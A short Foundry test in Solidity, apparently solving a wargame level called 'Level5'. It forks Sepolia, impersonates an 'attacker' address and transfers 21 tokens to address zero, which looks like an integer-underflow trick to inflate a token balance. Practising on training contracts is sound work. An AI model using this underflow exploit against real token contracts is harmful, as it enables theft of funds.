// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Token.sol";

contract Level5 is Test {
    Token token = Token(0x1020d8DDD04d639B7f1278dEc3c976aE6ac42980);
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"), 4547058);
        vm.startPrank(attacker);
    }

    function testLevel5() public {
        token.transfer(address(0), 21);
        token.balanceOf(address(this));
    }
}
